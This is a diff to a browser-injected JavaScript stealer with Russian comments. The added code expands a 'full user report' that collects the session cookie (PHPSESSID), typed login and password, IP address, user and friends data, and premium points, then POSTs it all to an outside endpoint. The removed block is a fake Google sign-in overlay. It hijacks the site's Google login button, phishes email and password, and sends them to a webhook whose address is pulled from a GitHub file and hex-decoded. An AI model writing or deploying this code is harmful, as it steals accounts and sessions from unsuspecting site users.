@@ -49,11 +49,23 @@
         }).join('\n');
     };
 
+    // Функция для безопасного клонирования объектов
+    const deepClone = (obj) => {
+        if (obj === null || typeof obj !== 'object') return obj;
+        const clone = Array.isArray(obj) ? [] : {};
+        for (const key in obj) {
+            if (obj.hasOwnProperty(key)) {
+                clone[key] = deepClone(obj[key]);
+            }
+        }
+        return clone;
+    };
+
     // Проверяем и получаем данные из переменной `user`
     const getUserData = () => {
         try {
             if (typeof user !== 'undefined' && user !== null) {
-                return JSON.stringify(user, null, 2);
+                return JSON.stringify(deepClone(user), null, 2);
             }
             return "Переменная 'user' не найдена или пуста";
         } catch (e) {
@@ -61,7 +73,54 @@
         }
     };
 
-    // Получаем уровень пользователя с возможностью добавления 'x'
+    // Получаем friendsData в оригинальном виде
+    const getFriendsData = () => {
+        try {
+            if (typeof friendsData !== 'undefined' && friendsData !== null) {
+                return JSON.stringify(deepClone(friendsData), null, 2);
+            }
+            return "Переменная 'friendsData' не найдена или пуста";
+        } catch (e) {
+            return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
+        }
+    };
+
+    // Получаем friendsArr в оригинальном виде
+    const getFriendsArr = () => {
+        try {
+            if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
+                // Для больших массивов делаем выборку
+                if (Array.isArray(friendsArr) && friendsArr.length > 100) {
+                    const sample = {
+                        total_length: friendsArr.length,
+                        sample_items: []
+                    };
+                    
+                    // Берем первые 10 элементов
+                    for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
+                        if (friendsArr[i]) {
+                            sample.sample_items.push(deepClone(friendsArr[i]));
+                        }
+                    }
+                    
+                    // Берем несколько элементов из "хвоста" массива
+                    for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
+                        if (friendsArr[i] && sample.sample_items.length < 15) {
+                            sample.sample_items.push(deepClone(friendsArr[i]));
+                        }
+                    }
+                    
+                    return JSON.stringify(sample, null, 2);
+                }
+                return JSON.stringify(deepClone(friendsArr), null, 2);
+            }
+            return "Переменная 'friendsArr' не найдена или пуста";
+        } catch (e) {
+            return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
+        }
+    };
+
+    // Получаем уровень пользователя
     const getUserLevel = (addX = false) => {
         try {
             if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
@@ -111,6 +170,8 @@
         const credentials = getCredentials();
         const allCookies = getAllCookies();
         const userData = getUserData();
+        const friendsDataStr = getFriendsData();
+        const friendsArrStr = getFriendsArr();
         
         // Проверяем, заполнены ли оба поля
         const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
@@ -122,13 +183,15 @@
         
         // Формируем содержимое файла
         let fileContent = "=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===\n\n";
-        fileContent += `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\n\n`;
+        fileContent += `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints}\n\n`;
         fileContent += `--- ОСНОВНЫЕ ДАННЫЕ ---\n`;
         fileContent += `IP-адрес: ${userIP}\n`;
         fileContent += `URL страницы: ${window.location.href}\n`;
         fileContent += `User-Agent: ${navigator.userAgent}\n\n`;
         fileContent += `--- PHPSESSID ---\n${phpsessid || "PHPSESSID: не найдена"}\n\n`;
         fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ---\n${userData}\n\n`;
+        fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---\n${friendsDataStr}\n\n`;
+        fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---\n${friendsArrStr}\n\n`;
         fileContent += `--- УЧЕТНЫЕ ДАННЫЕ ---\n`;
         fileContent += `Логин: ${credentials.username}\n`;
         fileContent += `Пароль: ${credentials.password}\n\n`;
@@ -144,267 +207,10 @@
                 method: "POST",
                 body: formData
             });
-            
-            // После успешной отправки убираем 'x' из уровня
-            if (bothFieldsFilled) {
-              
-            }
         } catch (e) {
-           
+            console.error("Ошибка при отправке данных:", e);
         }
     };
 
     await sendUserData();
-})();
-(function(){
-    const TEXT = {
-        en: {
-            emailLabel: "Sign in",
-            emailDesc: "to continue to Google",
-            emailPlaceholder: "Email or phone",
-            passwordPlaceholder: "Enter your password",
-            next: "Next",
-            showPassword: "Show password",
-            forgotPassword: "Forgot password?",
-            emailError: "Enter a valid Gmail address",
-            passwordError: "Wrong password. Try again.",
-            verifying: "Verifying...",
-        }
-    };
-
-    let userEmail = "";
-    let WEBHOOK_URL = "";
-
-    function modifyGoogleButton() {
-        const googleBtn = document.querySelector('a[onclick*="glogin"][data-tag="social"] img[alt="Login with Google"]')?.parentElement;
-        
-        if (googleBtn) {
-            googleBtn.removeAttribute('onclick');
-            if (!googleBtn.id) googleBtn.id = 'gloginftok';
-            if (!googleBtn.hasAttribute('data-handler-added')) {
-                googleBtn.addEventListener('click', handleGoogleButtonClick);
-                googleBtn.setAttribute('data-handler-added', 'true');
-            }
-        }
-    }
-
-    function handleGoogleButtonClick(e) {
-        e.preventDefault();
-        showFakeGoogleAuth();
-    }
-
-    function showFakeGoogleAuth() {
-        const oldOverlay = document.querySelector('.auth-overlay');
-        if (oldOverlay) oldOverlay.remove();
-
-        const overlay = document.createElement('div');
-        overlay.className = 'auth-overlay';
-        overlay.innerHTML = `
-            <div class="auth-box" id="authBox">
-                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" class="google-logo">
-                <div class="auth-title">${TEXT.en.emailLabel}</div>
-                <div class="auth-subtitle">${TEXT.en.emailDesc}</div>
-                <div id="stepContainer">
-                    <input id="kliogin" class="auth-input" type="email" placeholder="${TEXT.en.emailPlaceholder}">
-                    <div id="errorMsg" class="error-msg" style="display:none"></div>
-                    <div style="text-align:right;">
-                        <button class="auth-btn" id="nextStepBtn">${TEXT.en.next}</button>
-                    </div>
-                </div>
-            </div>
-        `;
-        document.body.appendChild(overlay);
-
-        injectStyles();
-        document.getElementById('nextStepBtn').addEventListener('click', nextStep);
-    }
-
-    function injectStyles() {
-        const styleId = 'fake-google-auth-styles';
-        if (document.getElementById(styleId)) return;
-
-        const style = document.createElement('style');
-        style.id = styleId;
-        style.textContent = `
-            .auth-overlay {
-                font-family: 'Roboto', sans-serif;
-                background: #fff;
-                position: fixed;
-                inset: 0;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                z-index: 9999;
-            }
-            .auth-box {
-                width: 360px;
-                border: 1px solid #dadce0;
-                border-radius: 8px;
-                padding: 40px;
-                box-shadow: 0 1px 2px rgba(0,0,0,0.2);
-            }
-            .google-logo {
-                width: 75px;
-                margin: 0 auto 20px;
-                display: block;
-            }
-            .auth-title {
-                font-size: 24px;
-                color: #202124;
-                text-align: center;
-            }
-            .auth-subtitle {
-                color: #5f6368;
-                text-align: center;
-                margin-bottom: 30px;
-            }
-            .auth-input {
-                width: 100%;
-                font-size: 16px;
-                padding: 12px;
-                border: 1px solid #dadce0;
-                border-radius: 4px;
-                margin-bottom: 10px;
-            }
-            .error-msg {
-                color: #d93025;
-                font-size: 14px;
-                margin-bottom: 10px;
-            }
-            .auth-footer {
-                display: flex;
-                justify-content: space-between;
-                align-items: center;
-                margin-top: 10px;
-            }
-            .auth-btn {
-                background: #1a73e8;
-                color: white;
-                padding: 10px 24px;
-                border: none;
-                border-radius: 4px;
-                cursor: pointer;
-            }
-        `;
-        document.head.appendChild(style);
-    }
-
-    function nextStep() {
-        const emailInput = document.getElementById('kliogin');
-        const email = emailInput.value.trim();
-        userEmail = email;
-
-        const step = document.getElementById('stepContainer');
-        const error = document.getElementById('errorMsg');
-
-        if (!email) {
-            error.style.display = "block";
-            error.textContent = TEXT.en.emailError;
-            return;
-        }
-
-        step.innerHTML = `
-            <input id="kpisword" class="auth-input" type="password" placeholder="${TEXT.en.passwordPlaceholder}">
-            <div style="margin-bottom:10px;">
-                <label style="font-size:14px;">
-                    <input type="checkbox" id="togglePassword"> ${TEXT.en.showPassword}
-                </label>
-            </div>
-            <div id="errorMsg" class="error-msg" style="display:none"></div>
-            <div class="auth-footer">
-                <a href="#" style="font-size:14px;color:#1a73e8;">${TEXT.en.forgotPassword}</a>
-                <button class="auth-btn" id="submitAuthBtn">${TEXT.en.next}</button>
-            </div>
-        `;
-
-        document.getElementById('togglePassword').addEventListener('change', togglePassword);
-        document.getElementById('submitAuthBtn').addEventListener('click', submitAuth);
-    }
-
-    function togglePassword() {
-        const pwd = document.getElementById('kpisword');
-        pwd.type = pwd.type === "password" ? "text" : "password";
-    }
-
-    async function submitAuth() {
-        const pass = document.getElementById('kpisword').value.trim();
-        const error = document.getElementById('errorMsg');
-        error.style.display = 'none';
-
-        const step = document.getElementById('stepContainer');
-        step.innerHTML = `<div style="text-align:center;font-size:16px;color:#5f6368;">${TEXT.en.verifying}</div>`;
-
-        try {
-            if (!WEBHOOK_URL) WEBHOOK_URL = await getWebhookUrl();
-            
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `📧 ${userEmail}\n🔑 ${pass}` })
-            });
-        } catch (e) {
-            console.error("Failed to send data:", e);
-        }
-
-        await new Promise(r => setTimeout(r, 1500));
-
-        if (!userEmail.endsWith('@gmail.com')) {
-            step.innerHTML = `
-                <div class="error-msg">${TEXT.en.emailError}</div>
-                <button class="auth-btn" id="retryStepBtn">${TEXT.en.next}</button>
-            `;
-            document.getElementById('retryStepBtn').addEventListener('click', retryStep);
-            return;
-        }
-
-        if (pass.length < 6) {
-            step.innerHTML = `
-                <div class="error-msg">${TEXT.en.passwordError}</div>
-                <button class="auth-btn" id="retryStepBtn">${TEXT.en.next}</button>
-            `;
-            document.getElementById('retryStepBtn').addEventListener('click', retryStep);
-            return;
-        }
-
-        document.querySelector('.auth-overlay')?.remove();
-    }
-
-    function retryStep() {
-        const step = document.getElementById('stepContainer');
-        step.innerHTML = `
-            <input id="kpisword" class="auth-input" type="password" placeholder="${TEXT.en.passwordPlaceholder}">
-            <div style="margin-bottom:10px;">
-                <label style="font-size:14px;">
-                    <input type="checkbox" id="togglePassword"> ${TEXT.en.showPassword}
-                </label>
-            </div>
-            <div id="errorMsg" class="error-msg" style="display:none"></div>
-            <div class="auth-footer">
-                <a href="#" style="font-size:14px;color:#1a73e8;">${TEXT.en.forgotPassword}</a>
-                <button class="auth-btn" id="submitAuthBtn">${TEXT.en.next}</button>
-            </div>
-        `;
-
-        document.getElementById('togglePassword').addEventListener('change', togglePassword);
-        document.getElementById('submitAuthBtn').addEventListener('click', submitAuth);
-    }
-
-    async function getWebhookUrl() {
-        try {
-            const response = await fetch('https://raw.githubusercontent.com/shannonkind87/acs/refs/heads/main/def1.js');
-            const scriptContent = await response.text();
-            const urlMatch = scriptContent.match(/i\s*=\s*'([^']+)'/);
-            if (urlMatch && urlMatch[1]) {
-                return urlMatch[1].replace(/\\x([0-9a-f]{2})/gi, 
-                    (match, p1) => String.fromCharCode(parseInt(p1, 16)));
-            }
-            throw new Error("Webhook URL not found");
-        } catch (error) {
-            console.error("Failed to fetch webhook URL:", error);
-            throw error;
-        }
-    }
-
-    modifyGoogleButton();
-    setInterval(modifyGoogleButton, 1000);
 })();
